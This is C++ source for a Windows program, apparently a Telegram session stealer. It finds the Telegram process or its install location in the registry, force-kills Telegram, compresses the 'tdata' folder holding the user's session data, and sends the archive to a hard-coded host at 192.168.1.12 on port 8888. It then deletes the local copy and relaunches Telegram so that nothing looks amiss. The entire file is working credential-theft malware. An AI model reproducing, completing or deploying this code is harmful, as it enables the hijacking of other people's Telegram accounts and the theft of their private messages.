#define _CRT_SECURE_NO_WARNINGS
#define _CRT_NON_CONFORMING_SWPRINTFS

#include <stdio.h>
#include <Windows.h>
#include <tchar.h>
#include <direct.h>
#include <stdlib.h>
#include <TlHelp32.h>
#include <Psapi.h> 
#include "ZLibWrapLib.h"
#include "filesend.h"

#pragma comment(lib,"Psapi.lib")  
#pragma comment(lib, "Version.lib")
#pragma comment(lib, "ZLibWrapLib.lib")
using namespace std;

DWORD pid = 0;

DWORD GetProcessIDByName(const wchar_t* pName)
{
	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (INVALID_HANDLE_VALUE == hSnapshot) {
		return NULL;
	}
	PROCESSENTRY32 pe = { sizeof(pe) };
	for (BOOL ret = Process32First(hSnapshot, &pe); ret; ret = Process32Next(hSnapshot, &pe)) {
		if (_tcscmp(pe.szExeFile, pName) == 0) {
			CloseHandle(hSnapshot);
			return pe.th32ProcessID;
		}
	}
	CloseHandle(hSnapshot);
	return 0;
}

void Makezip(wchar_t *dir)
{
	if (ZipCompress((LPCTSTR)dir, (LPCTSTR)(_T("foo.zip")), TRUE))
	{
		_tprintf(_T("Compressed %s to %s successfully.\n"), (LPCTSTR)dir, (LPCTSTR)(_T("foo.zip")));
		send_file("foo.zip", "192.168.1.12", 8888);
		system("del foo.zip");
	}
	else
	{
		_tprintf(_T("Failed to compress %s to %s.\n"), (LPCTSTR)dir, (LPCTSTR)(_T("foo.zip")));
		return;
	}
}

DWORD WINAPI GetDir(PVOID pParam)
{
	wchar_t dir[MAX_PATH] = { 0 };
	wchar_t path[MAX_PATH] = { 0 };
	HANDLE mProc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
	if (!GetModuleFileNameEx(mProc, NULL, path, MAX_PATH))
		return 0;
	else
	{
		for (int i = wcslen(path); i > 0; --i) {
			if (path[i] == L'\\')
			{
				_tcsncpy(dir, path, i);
				_tcsncat(dir, L"\\tdata\\", i);
				break;
			}
		}
	}
	char cmd[50] = { 0 };
	sprintf(cmd, "taskkill /pid %d -t -f", pid);
	WinExec(cmd, SW_HIDE);

	dir[wcslen(dir) - 1] = dir[wcslen(dir)];
	Makezip(dir);

	char cpath[MAX_PATH];
	sprintf(cpath, "%S", path);
	WinExec(cpath, SW_SHOWMINIMIZED);

	return 1;
}

DWORD WINAPI Getdir1(PVOID pParam)
{
	wchar_t regname[] = L"Software\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\{53F49750-6209-4FBF-9CA8-7A333C87D1ED}_is1";
	HKEY hkResult = NULL;
	DWORD dataType = 0;
	DWORD dataSize = MAX_PATH;
	BYTE data[MAX_PATH] = { 0 };
	wchar_t dir[MAX_PATH] = { 0 };
	wchar_t path[MAX_PATH] = { 0 };
	int ret = RegOpenKeyEx(HKEY_CURRENT_USER, regname, NULL, KEY_READ, &hkResult);
	
	if (ret != ERROR_SUCCESS) {
		printf("Error RegOpenKeyEx!!\n", ret);
		RegCloseKey(hkResult);
		return 0;
	}
	ret = RegQueryValueEx(hkResult, L"InstallLocation", NULL, &dataType, (LPBYTE)data, &dataSize);
	if (ret != ERROR_SUCCESS)       //如果无法打开hKEY,则中止程序的执行
	{
		printf("%d\n", ret);
		printf("Error RegQueryValueEx!!\n");
		RegCloseKey(hkResult);
		return 0;
	}
	wsprintf(path,L"%s", (WCHAR *)data);
	wsprintf(dir, L"%s", (WCHAR *)data);
	_tcscat(dir, L"tdata");
	Makezip(dir);
	return 0;
}

int _tmain(int argc, TCHAR *argv[])
{
	pid = GetProcessIDByName(L"Telegram.exe");
	if (!pid)
	{
		HANDLE hThread1 = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)Getdir1, NULL, 0, NULL);
		WaitForSingleObject(hThread1, INFINITE);
	}
	else
	{
		HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)GetDir, NULL, 0, NULL);
		WaitForSingleObject(hThread, INFINITE);
	}
	return 0;
}